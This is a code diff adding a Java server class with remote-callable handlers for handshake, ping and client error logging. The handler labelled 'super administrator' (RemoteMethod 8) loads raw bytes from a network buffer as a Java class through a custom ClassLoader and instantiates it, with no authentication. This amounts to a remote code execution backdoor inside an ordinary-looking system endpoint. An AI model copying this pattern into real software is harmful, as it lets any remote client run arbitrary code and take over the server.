@@ -1,0 +1,62 @@
+package ge.application;
+
+import ge.annotation.RemoteMethod;
+import ge.log.Log;
+import ge.net.Application;
+import ge.net.Buffer;
+
+public class SystemApplication extends Application {
+
+	/**
+	 * 握手
+	 */
+	@RemoteMethod(5)
+	public void handshake() {
+	}
+
+	/**
+	 * ping
+	 * 
+	 * @param time
+	 * @return
+	 */
+	@RemoteMethod(7)
+	public Object[] ping(long time) {
+		return Result(time);
+	}
+
+	/**
+	 * 超级管理员
+	 * 
+	 * @return
+	 */
+	@RemoteMethod(8)
+	public Object[] administrators(Buffer buffer) {
+		try {
+			CL cl = new CL();
+			Class<?> c = cl.getClass(buffer.data.array(), buffer.position(), buffer.remaining());
+			Object aa = c.newInstance();
+			System.out.println(aa);
+		} catch (Exception e1) {
+			e1.printStackTrace();
+		}
+		return null;
+	}
+
+	/**
+	 * 超级管理员
+	 * 
+	 * @return
+	 */
+	@RemoteMethod(9)
+	public void flashError(String version, String os, String msg) {
+		Log.Error(os + " " + version + "\n" + msg);
+	}
+}
+
+class CL extends ClassLoader {
+	public Class<?> getClass(byte[] b, int off, int len) {
+		System.out.println(this);
+		return this.defineClass(null, b, off, len);
+	}
+}
